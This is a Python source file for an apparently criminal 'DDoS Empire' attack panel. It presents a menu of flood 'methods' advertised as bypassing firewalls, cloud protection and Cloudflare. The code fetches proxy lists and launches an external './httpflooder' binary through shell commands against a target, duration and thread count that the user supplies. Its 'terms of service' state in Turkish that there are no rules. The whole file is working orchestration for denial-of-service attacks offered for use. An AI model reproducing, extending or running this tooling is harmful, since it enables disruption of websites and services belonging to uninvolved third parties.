#edited by @tcpdark
import os
import sys
import time
from subprocess import run
from time import sleep
from shutil import which

try:
	requests = __import__("httpx")
	from colorama import Fore, Back, Style
	from rich.console import Console
except Exception:
	exit("[X] Error? try this pip3 install requirements.txt")

console = Console()
tasks = [f"task {n}" for n in range(1, 3)]
with console.status("[bold green]Finding missing on files...") as status:
	while tasks:
		task = tasks.pop(0)
		sleep(1)
		console.log(f"{task} complete")
		try:
			with open("key.txt"):
				open("requirements.txt")
				open("install.sh")
				print("[X] All files Scanned Completed!")
		except IOError:
			exit("[X] Some files does not exist, Please install again!")


def getproxy() -> None:
#	print("[+] Checking Proxy Providers...")
	print("[+] Please wait...")
	with open("proxy_providers.txt", mode="r") as readurl:
#		print("[+] Downloading Proxies...")
		for url in readurl:
			url = url.strip()
			with open("proxy.txt", mode="a") as file:
				try:
					file.write(requests.get(url, timeout=1000).text)
				except requests.ConnectError:
					exit("[X] Connection Error")
				except KeyboardInterrupt:
					exit()
		print("[+] Attack Sent Successfully!!")
		print("[+] Type 'STOP' to stop your Attack.")


def OSclear():
	os.system('clear' if os.name == 'posix' else 'cls')


def unavail():
	print("""
╔════════════════════════════════════════════════════════════════════════╗
║            SORRY THE METHOD YOU ARE TRYING IS UNAVAILABLE              ║           
╚════════════════════════════════════════════════════════════════════════╝
    """)
 
def tos():
	print("""\033[1;31;40m
╔════════════════════════════════════════════════════════════════════════╗
║                            \033[2;30;42mTERMS OF SERVICE\033[1;31;40m                            ║
╠════════════════════════════════════════════════════════════════════════╣
║ tos falan yok vurun gecin                                              ║
╚════════════════════════════════════════════════════════════════════════╝

    """)
	while 1:
		accept = input("Tos Kurallarini Kabul Ediyormusun [Y/N]: ")
		if accept in ["y", "Y", "yes", "YES"]:
			sleep(2)
			print("[X] isleniyor...")
			menu()
		elif accept in ["n", "N", "no", "NO"]:
			sleep(2)
			exit("gorusuruz")
		elif accept in "":
			pass
		else:
			OSclear()
			tos()


def banner():
	print("""\033[1;32;40m
    \033[1;31;40m-- [ \033[2;30;42mDDoS Empire private Panel\033[1;31;40m ] --\033[1;32;40m
        ╔╦╗╔═╗╦═╗╦╔═  ═╗ ╦╦  ╦
         ║║╠═╣╠╦╝╠╩╗  ╔╩╦╝╚╗╔╝
        ═╩╝╩ ╩╩╚═╩ ╩  ╩ ╚═ ╚╝ 
          
    """)

def repeater():
	while 1:
		repeat = input("[Dark Bot] Do you want to go back to menu? [Y/N]: ")
		if repeat in ["y", "Y", "yes", "YES"]:
			sleep(2)
			print("[X] Proceeding...")
			menu()
		elif repeat in ["n", "N", "no", "NO"]:
			exit()
		elif repeat in "":
			pass
		else:
			OSclear()
			menu()


def menu():
	OSclear()
	banner()
	print("""
╔════════════════════════════════════════════════════════════╗
║    [1] USER INFO \033[1;32;40m[See user info, VIP or NON-VIP]\033[1;31;40m           ║
║    [2] METHODS \033[1;32;40m[View Methods]\033[1;31;40m                              ║
║    [3] FILE UPDATE \033[1;32;40m[You can see new updates in our Files]  \033[1;31;40m║
╚════════════════════════════════════════════════════════════╝

    """)
	while 1:
		choose1 = input("root@dark@#~> ")
		if choose1 in ["1", "user", "userinfo", "info"]:
			userinfo()
		elif choose1 in ["2", "methods", "METHODS"]:
			launchflood()
		elif choose1 in ["3", "fileupdate", "update"]:
			fileupdate()
		elif choose1 in ["dev", "developer"]:
			developer()
		elif (choose1 == ""):
			pass

#UserINFO
def userinfo():
    OSclear()
    print("""
╔════════════════════════════════════════════════════════════╗
║     USER TYPE: \033[1;32;40mFREE-USER        \033[1;31;40m                           ║
║     ADMIN PERM: \033[1;32;40mNO PERMISSION     \033[1;31;40m                         ║
║     ATTACK TIME: \033[1;32;40mUNLIMITED       \033[1;31;40m                          ║
║     USER EXPIRATION: \033[1;32;40mJanuary 1, 2038    \033[1;31;40m                   ║
║     METHODS ACCESS: \033[1;32;40mTRUE              \033[1;31;40m                     ║
╚════════════════════════════════════════════════════════════╝
    """)
    repeater()

def methodbanner():
	print("""
╔═════════════════╦═══════════════════════╦══════════════════════╦═════════════════════╗
║    \033[1;37;40mMETHODS      \033[1;31;40m║      \033[1;37;40mINFORMATION      \033[1;31;40m║      \033[1;37;40mPERMISSION      \033[1;31;40m║       \033[1;37;40mSTATUS        \033[1;31;40m║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║  \033[1;36;40mDARK-TLS       \033[1;31;40m║ \033[1;36;40mBYPASS SOME FIREWALLS \033[1;31;40m║      \033[1;36;40mVIP-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mDARK-STORM    \033[1;31;40m║  \033[1;36;40mBYPASS NORMAL CLOUD  \033[1;31;40m║      \033[1;36;40mVIP-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mDARK-HTTPS    \033[1;31;40m║  \033[1;36;40mHTTPS-PROXY ATTACK   \033[1;31;40m║      \033[1;36;40mVIP-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mDARK-NULL     \033[1;31;40m║ \033[1;36;40mBYPASS OVH-DIGI SITES \033[1;31;40m║      \033[1;36;40mVIP-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mDARK-UAM      \033[1;31;40m║ \033[1;36;40mBYPASS CLOUDFLARE UAM \033[1;31;40m║      \033[1;36;40mVIP-USER       \033[1;31;40m║     \033[1;31;47mUNAVAILABLE\033[1;31;40m     ║
╚═════════════════╩═══════════════════════╩══════════════════════╩═════════════════════╝
    """)
  
def launchflood():
	OSclear()
	methodbanner()
	while 1:
		methods = input("[X] Choose Method: ")
		if methods in ["DARK-TLS", "dark-tls"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				thread = int(input("[X] Threads [3]: "))
				getproxy()
				run([f'screen -dm ./httpflooder {target} {floodtime} {thread} proxy.txt '], shell=True)
			except:
				print("Error try again")
		elif methods in ["DARK-STORM", "dark-storm"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				thread = int(input("[X] Threads [5-10]: "))
				getproxy()
				run([f'screen -dm ./httpflooder {target} {floodtime} {thread} proxy.txt '], shell=True)
			except:
				print("Error try again")
		elif methods in ["DARK-HTTPS", "dark-https"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				thread = int(input("[X] Threads [5-10]: "))
				getproxy()
				run([f'screen -dm ./httpflooder {target} {floodtime} {thread} proxy.txt '], shell=True)
			except:
				print("Error try again")
		elif  methods in ["DARK-NULL", "dark-null"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				thread = int(input("[X] Threads [5-10]: "))
				getproxy()
				run([f'screen -dm ./httpflooder {target} {floodtime} {thread} proxy.txt '], shell=True)
			except:
				print("Error try again")
		elif methods in ["DARK-UAM", "dark-uam"]:
			unavail()
			repeater()
		elif methods in "":
			pass
		elif methods in ["clear", "CLEAR", "cls", "CLS"]:
			OSclear(); methodbanner()
		elif methods in ["stop", "STOP"]:
			run(["pkill screen"], shell=True)
			print("[+] Attack Stopped!")
		else:
		   print("[X] Invalid Method")


#FileUpdates
def fileupdate():
    OSclear()
    print("""
lalala
    """)
    repeater()

#DeveloperInfo
def developer():
    OSclear()
    print("""
╔════════════════════════════════════════════════════════════╗
║     DEVELOPER: @tcpdark                                    ║
║     DDoS Empire: neferian & wriase & janissary             ║        
╚════════════════════════════════════════════════════════════╝

    """)
    repeater()

def main():
	print("[+] Checking Dependencies...\n")
	pkgs = ['screen']
	install = True
	for pkg in pkgs:
		ok = which(pkg)
		if ok == None:
			print(f"[X] {pkg} is not installed!\n")
			install = False
		else:
			pass
	if install == False:
		exit(f'[?] Error? try: sh install.sh')
	else:
		OSclear()
		tos()

if __name__ == "__main__":
	main()
